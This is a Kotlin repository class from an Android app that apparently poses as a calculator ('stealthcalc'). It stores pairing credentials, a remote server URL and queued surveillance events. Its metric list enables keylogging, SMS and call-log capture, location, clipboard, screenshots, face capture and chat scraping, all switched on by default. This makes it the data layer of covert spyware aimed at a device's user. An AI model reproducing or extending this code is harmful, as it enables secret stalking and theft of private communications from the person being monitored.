package com.stealthcalc.monitoring.data

import android.content.SharedPreferences
import com.stealthcalc.core.di.EncryptedPrefs
import com.stealthcalc.monitoring.model.MonitoringEvent
import com.stealthcalc.monitoring.model.MonitoringEventKind
import kotlinx.coroutines.flow.Flow
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class MonitoringRepository @Inject constructor(
    private val dao: MonitoringDao,
    @EncryptedPrefs private val prefs: SharedPreferences,
) {

    companion object {
        const val KEY_MONITORING_ROLE = "monitoring_role"
        const val KEY_SERVER_URL = "monitoring_server_url"
        const val KEY_DEVICE_ID = "monitoring_device_id"
        const val KEY_AUTH_TOKEN = "monitoring_auth_token"
        const val KEY_DEVICE_NAME = "monitoring_device_name"
        const val KEY_ENABLED_METRICS = "monitoring_enabled_metrics"
        const val KEY_LAST_SYNC = "monitoring_last_sync"

        const val ROLE_DISABLED = "disabled"
        const val ROLE_AGENT = "agent"
        const val ROLE_DASHBOARD = "dashboard"
        const val ROLE_BOTH = "both"

        val ALL_METRICS = setOf(
            "app_usage", "screen_events", "battery", "network",
            "app_installs", "notifications", "location",
            "call_log", "sms", "media_changes", "security_events",
            "media_upload", "file_sync", "chat_media",
            "screenshots", "face_capture",
            "chat_scraping", "clipboard", "keylogger",
        )
    }

    val role: String get() = prefs.getString(KEY_MONITORING_ROLE, ROLE_DISABLED) ?: ROLE_DISABLED
    val isAgent: Boolean get() = role == ROLE_AGENT || role == ROLE_BOTH
    val isDashboard: Boolean get() = role == ROLE_DASHBOARD || role == ROLE_BOTH
    val serverUrl: String get() = prefs.getString(KEY_SERVER_URL, "") ?: ""
    val deviceId: String get() = prefs.getString(KEY_DEVICE_ID, "") ?: ""
    val authToken: String get() = prefs.getString(KEY_AUTH_TOKEN, "") ?: ""
    val deviceName: String get() = prefs.getString(KEY_DEVICE_NAME, "") ?: ""
    val isPaired: Boolean get() = authToken.isNotEmpty() && deviceId.isNotEmpty()

    val enabledMetrics: Set<String>
        get() {
            val raw = prefs.getString(KEY_ENABLED_METRICS, null)
            return if (raw.isNullOrBlank()) ALL_METRICS else raw.split(",").toSet()
        }

    fun isMetricEnabled(metric: String): Boolean = metric in enabledMetrics

    fun setRole(role: String) {
        prefs.edit().putString(KEY_MONITORING_ROLE, role).apply()
    }

    fun setServerUrl(url: String) {
        prefs.edit().putString(KEY_SERVER_URL, url).apply()
    }

    fun savePairing(deviceId: String, token: String) {
        prefs.edit()
            .putString(KEY_DEVICE_ID, deviceId)
            .putString(KEY_AUTH_TOKEN, token)
            .apply()
    }

    fun setDeviceName(name: String) {
        prefs.edit().putString(KEY_DEVICE_NAME, name).apply()
    }

    fun setEnabledMetrics(metrics: Set<String>) {
        prefs.edit().putString(KEY_ENABLED_METRICS, metrics.joinToString(",")).apply()
    }

    fun clearPairing() {
        prefs.edit()
            .remove(KEY_DEVICE_ID)
            .remove(KEY_AUTH_TOKEN)
            .apply()
    }

    fun setLastSync(timestampMs: Long) {
        prefs.edit().putLong(KEY_LAST_SYNC, timestampMs).apply()
    }

    val lastSync: Long get() = prefs.getLong(KEY_LAST_SYNC, 0L)

    suspend fun recordEvent(kind: MonitoringEventKind, payload: String) {
        dao.insert(MonitoringEvent(kind = kind, payload = payload))
    }

    suspend fun getUnsent(limit: Int = 500): List<MonitoringEvent> = dao.getUnsent(limit)

    suspend fun markUploaded(ids: List<String>) = dao.markUploaded(ids)

    suspend fun pruneOldEvents(maxAgeMs: Long = 7 * 24 * 3600 * 1000L) {
        dao.deleteUploadedBefore(System.currentTimeMillis() - maxAgeMs)
    }

    fun unsentCount(): Flow<Int> = dao.unsentCount()

    suspend fun getRecent(limit: Int = 100) = dao.getRecent(limit)
}
